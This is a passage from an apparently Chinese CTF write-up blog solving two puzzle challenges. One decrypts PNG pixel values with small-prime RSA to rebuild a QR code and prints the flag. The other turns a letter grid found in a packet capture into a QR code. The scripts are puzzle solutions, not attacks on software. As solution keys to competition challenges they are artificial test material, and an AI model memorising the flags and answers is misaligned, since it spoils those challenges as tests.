</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>dic</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;hint.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>width</span><span class=p>,</span><span class=n>height</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>size</span> <span class=c1># 50 50</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>height</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>width</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>pixel</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>pixel</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>dic</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>dic</span><span class=p>[</span><span class=n>pixel</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>dic</span><span class=p>[</span><span class=n>pixel</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(len(dic)) # 2496</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>dic</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>发现2500个像素点中有2496种像素，并且只有以下两种像素出现了2次，别的像素都是只出现一次</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(133, 167, 215): 2
</span></span><span class=line><span class=cl>(31, 163, 119): 2</span></span></code></pre></td></tr></table></div></div><p>我们把所有像素打印出来可以发现，每个像素的RGB值都是取自我们之前得到的<code>e</code>的取值范围中</p><p>然后我们再去看<code>task.png</code>，发现图像时RGBA格式的，只不过A通道的值都是255</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>dic</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;task.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>width</span><span class=p>,</span><span class=n>height</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>size</span> <span class=c1># 50 50</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>height</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>width</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>pixel</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>pixel</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>dic</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>dic</span><span class=p>[</span><span class=n>pixel</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>dic</span><span class=p>[</span><span class=n>pixel</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(len(dic)) # 1112</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(dic)</span></span></span></code></pre></td></tr></table></div></div><p>发现一共有1112种不同的像素</p><p>并且背景接近白色的像素点的RGBA的值为<code>(246, 246, 246, 255)</code>，黑色像素点的RGBA值为<code>(0, 0, 0, 255)</code></p><blockquote><p>后来在 <code>@Aura</code> 师傅的帮助下，发现了其实图片中的每个像素的每个RGB的值都是RSA加密中的参数</p></blockquote><p>因为我们之前得到了，<code>hint.png</code>中每个像素的每个RGB值都在<code>e</code>的取值范围中</p><p>然后<code>hint.png</code>和<code>task.png</code>的长宽是一样的，也就是说像素的个数以及RGB值的个数也是一样的，所以是一一对应的</p><p>因此我们可以联想到，把每个像素的每个RGB值都做一次RSA解密，<code>hint.png</code>中的是<code>e</code>，<code>task.png</code>中的是密文<code>c</code></p><p>最后把我们RSA解密得到的<code>m</code>转为RGB值塞回图像中即可复原出二维码，扫码即可得到最后的flag：<code>DASCTF{R54_W1th_Cv_1s_Fun}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250818213430714.png alt=/posts/bb1da35/imgs/image-20250818213430714.png height=824 width=1624></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250818213401070.png alt=/posts/bb1da35/imgs/image-20250818213401070.png height=1205 width=3822></p><p>最终的解题脚本如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>13</span>
</span></span><span class=line><span class=cl><span class=n>q</span> <span class=o>=</span> <span class=mi>19</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span> <span class=c1># 247</span>
</span></span><span class=line><span class=cl><span class=n>phi</span> <span class=o>=</span> <span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=c1># 216</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_e</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>e_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;hint.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>width</span><span class=p>,</span><span class=n>height</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>height</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>width</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>pixel</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>pixel</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>e_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>item</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>e_list</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>e_list</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>func1</span><span class=p>(</span><span class=n>e_list</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>c_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>m_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>img1</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;task.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>width</span><span class=p>,</span><span class=n>height</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>size</span> <span class=c1># 50 50</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>height</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>width</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span><span class=p>,</span><span class=n>g</span><span class=p>,</span><span class=n>b</span><span class=p>,</span><span class=n>a</span> <span class=o>=</span> <span class=n>img1</span><span class=o>.</span><span class=n>getpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>c_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>c_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>g</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>c_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>c_list</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>idx</span><span class=p>,</span><span class=n>e</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>e_list</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=n>c_list</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>d</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>e</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>m</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span> <span class=n>d</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>m_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>m</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>m_list</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>pixel_array</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>m_list</span><span class=p>,</span> <span class=n>dtype</span><span class=o>=</span><span class=n>np</span><span class=o>.</span><span class=n>uint8</span><span class=p>)</span><span class=o>.</span><span class=n>reshape</span><span class=p>((</span><span class=n>height</span><span class=p>,</span> <span class=n>width</span><span class=p>,</span> <span class=mi>3</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>img2</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>fromarray</span><span class=p>(</span><span class=n>pixel_array</span><span class=p>,</span> <span class=n>mode</span><span class=o>=</span><span class=s2>&#34;RGB&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img2</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s2>&#34;decrypted.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 处理完成，已保存为 decrypted.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>e_list</span> <span class=o>=</span> <span class=n>get_e</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>func1</span><span class=p>(</span><span class=n>e_list</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=题目名称-to2025天山固网><span>题目名称 to(2025天山固网)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-to2025%e5%a4%a9%e5%b1%b1%e5%9b%ba%e7%bd%91 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个pcapng流量包</p><p>翻看流量包，发现有一个<code>falg.rar</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250817224525993.png alt=/posts/bb1da35/imgs/image-20250817224525993.png height=1836 width=2810></p><p>尝试打开，发现需要密码，因此猜测我们还需要到流量包中寻找解压密码</p><p>我们先将所有http对象导出，然后依此查看</p><p>可以在hello.html中找到如下内容</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250817224708469.png alt=/posts/bb1da35/imgs/image-20250817224708469.png height=1576 width=2278></p><p>一开始以为是密码字典，但是经过尝试发现并不是</p><p>在导入过程中发现了这些字符组成了一个42x42的矩阵（正方形->猜测是二维码）</p><p>然后发现最外围一圈全是小写字母，因此尝试把大小写字母转为0和1，再转为二维码可以得到下图</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250817225004671.png alt=/posts/bb1da35/imgs/image-20250817225004671.png height=1168 width=2010></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>save_binary_to_png</span><span class=p>(</span><span class=n>data_str</span><span class=p>,</span> <span class=n>out_file</span><span class=o>=</span><span class=s2>&#34;output.png&#34;</span><span class=p>,</span> <span class=n>scale</span><span class=o>=</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=mi>42</span>
</span></span><span class=line><span class=cl>    <span class=n>w</span> <span class=o>=</span> <span class=mi>42</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=s2>&#34;L&#34;</span><span class=p>,</span> <span class=p>(</span><span class=n>w</span><span class=p>,</span> <span class=n>h</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>ch</span> <span class=o>=</span> <span class=n>data_str</span><span class=p>[</span><span class=n>y</span> <span class=o>*</span> <span class=n>w</span> <span class=o>+</span> <span class=n>x</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>ch</span> <span class=o>==</span> <span class=s2>&#34;1&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>img</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=mi>0</span><span class=p>)</span>     <span class=c1># 黑色</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>img</span><span class=o>.</span><span class=n>putpixel</span><span class=p>((</span><span class=n>x</span><span class=p>,</span> <span class=n>y</span><span class=p>),</span> <span class=mi>255</span><span class=p>)</span>   <span class=c1># 白色</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>scale</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span> <span class=o>=</span> <span class=n>img</span><span class=o>.</span><span class=n>resize</span><span class=p>((</span><span class=n>w</span><span class=o>*</span><span class=n>scale</span><span class=p>,</span> <span class=n>h</span><span class=o>*</span><span class=n>scale</span><span class=p>),</span> <span class=n>Image</span><span class=o>.</span><span class=n>NEAREST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>out_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Saved: </span><span class=si>{</span><span class=n>out_file</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>    xwsoawzfknojzwejkrmsewynkoichlsgxiduinsklf
</span></span></span><span class=line><span class=cl><span class=s1>    yPZUIQGHEadEGfohHeISleDsLvqleMaryIMUPMEAIc
</span></span></span><span class=line><span class=cl><span class=s1>    aOzezoevMpeIZmUABHDDQNAFwhgqynYtbAntvgbhNq
</span></span></span><span class=line><span class=cl><span class=s1>    dReTZSEuOjxCVRNGDvfzDZQmTTDZPfQwwYkEIEToDu
</span></span></span><span class=line><span class=cl><span class=s1>    cFrJVUCvBndOJRMFXppxMSVmYQSINrLrzUyIKPBuMv
</span></span></span><span class=line><span class=cl><span class=s1>    vJfLLPIgUnhjaFaiDafXIZnWlspnBSwmbSqKNGEjJt
</span></span></span><span class=line><span class=cl><span class=s1>    lEfHPSMrKmpoZlolmYamKOJARccoxlMonFrNAXUuOs
</span></span></span><span class=line><span class=cl><span class=s1>    tTrknqbzUnuTZAnzYlQxAJKUXhEHbxkgxOdbzcvbPe
</span></span></span><span class=line><span class=cl><span class=s1>    fLKJSSGZVsiXyIoqKgBgPBuZhXuqZpEtsJDENSSUKh
</span></span></span><span class=line><span class=cl><span class=s1>    zkyintuqwjfHOYCSiFSCbfMvTjYBlhDfgzfwryxfxf
</span></span></span><span class=line><span class=cl><span class=s1>    mgorlmjgqwiYEKEOcHVGzcCdKfXTwiFyyxakvffvmb
</span></span></span><span class=line><span class=cl><span class=s1>    pypIOXBuYdmRHfKYkqfkJEWrcqdwCaGDTETtdTYLBc
</span></span></span><span class=line><span class=cl><span class=s1>    qaOYZtXKgnqLqTvbGWFfNABIULxdzJrNFWfjqglGLa
</span></span></span><span class=line><span class=cl><span class=s1>    kpifniZqGmtGcwkwTbInapWDUSndLmYCEaRwbIZQjf
</span></span></span><span class=line><span class=cl><span class=s1>    zcRsskImaaktyaAEQCYwEMgfsmqowSXguEcjFUYacy
</span></span></span><span class=line><span class=cl><span class=s1>    cuXfchFnhrmppjNPDIPrZMtrkjfjaGZblQmhPVIxbu
</span></span></span><span class=line><span class=cl><span class=s1>    wPZJICEiALOANFwaIEgsFIMMceQFWCNOMfJvzpjtYw
</span></span></span><span class=line><span class=cl><span class=s1>    dOGMXoZPwERhAronbdWtURHrKuvhzOrhqExMCncXTp
</span></span></span><span class=line><span class=cl><span class=s1>    uEadoMPxWdqiqKQQydQgHIcDQSxsisEQQtBArnfWaq
</span></span></span><span class=line><span class=cl><span class=s1>    yZdNMVOQiLEqkIIEsWNgNGWknoAXlrSzymkMEiloNo
</span></span></span><span class=line><span class=cl><span class=s1>    jpxBPJKXTKYWuIjvvDvNqzwPShhhFYRUQcSQlRQaOf
</span></span></span><span class=line><span class=cl><span class=s1>    acjTBNFPQFZMsZrjzMjZcbhIHnmmCGYNMvEHtKMvHj
</span></span></span><span class=line><span class=cl><span class=s1>    aJXVLJrWbxufHmcoDjPXitiddVvrxBjtgOwjvWPqwc
</span></span></span><span class=line><span class=cl><span class=s1>    tpUvbIGZJnyxhYyxwYlxMLtfMRfvgjjebtaKNmvzhq
</span></span></span><span class=line><span class=cl><span class=s1>    fBfXVdAcmHHLJIKJaEHkuyJBHlOCkhUOKiDtBDMXKf
</span></span></span><span class=line><span class=cl><span class=s1>    niUOLbjbYgtDYqDQadcIhqsmoiszAgTkhzRHTgrtfu
</span></span></span><span class=line><span class=cl><span class=s1>    jFqyrqOtlrlBxKfoqzOlPDigEKIVowuVNtwowQTzNe
</span></span></span><span class=line><span class=cl><span class=s1>    wDpqogPjgpiInPbeycJfLKnpYSQRffcQAgbiqVHaHx
</span></span></span><span class=line><span class=cl><span class=s1>    zKsSVYWXDOCyxpIAPQyAXClurmQIPVRaawZlXysWwh
</span></span></span><span class=line><span class=cl><span class=s1>    aVibdxPPcwlVJzpvslGfLWnshkROmZsNVDwiYVCyOz
</span></span></span><span class=line><span class=cl><span class=s1>    cPdMGJHtWYDqWhhcCknGusYXZJqmVXVKRPSAsqvpKt
</span></span></span><span class=line><span class=cl><span class=s1>    kdbjynqdekdZseNYrEqYLFePAJDYYwHinccQndztIh
</span></span></span><span class=line><span class=cl><span class=s1>    mfsqtjkdxcsDaaUJuGfFCPiUEYOBUsKpfggIjyvuJp
</span></span></span><span class=line><span class=cl><span class=s1>    tJKWKWSHHokapfecpGfuyisXziSDkZPxhOoHMukVnk
</span></span></span><span class=line><span class=cl><span class=s1>    rLfpalbeTxacxFRHRpHZftGjtMXTOKYsrckHBBCCPo
</span></span></span><span class=line><span class=cl><span class=s1>    sXcHKNJkOgxURfidXZthchdBoTJTqbFYRJVIZemdXm
</span></span></span><span class=line><span class=cl><span class=s1>    oTbCRVEoQyhZYSQCaVrsNLpEWlckAsoXVvOPuNDGsv
</span></span></span><span class=line><span class=cl><span class=s1>    yTfMQCVxBiyTvvNRMibBGFDDNltjJOChlNpjALBoos
</span></span></span><span class=line><span class=cl><span class=s1>    lKoUHLBdFveKvzFPBwvLTVQHDypjNOGxrJdaDIBdnh
</span></span></span><span class=line><span class=cl><span class=s1>    rSobpwjtYkmwwawtRrHrFPMgzfobhntphVbFcAJmvn
</span></span></span><span class=line><span class=cl><span class=s1>    nHHKBFFGMzywuXjwZDgtqnPQRWJPQBVlhqPdJFTJcc
</span></span></span><span class=line><span class=cl><span class=s1>    bpvrwdbuhrgrgackekaotpwbeclbnlamzzuhrqmwjg
</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=s1>&#39;a&#39;</span> <span class=ow>and</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=s1>&#39;z&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=s1>&#39;0&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=s1>&#39;A&#39;</span> <span class=ow>and</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=s1>&#39;Z&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>+=</span> <span class=s1>&#39;1&#39;</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(flag)</span>
</span></span><span class=line><span class=cl>    <span class=n>save_binary_to_png</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
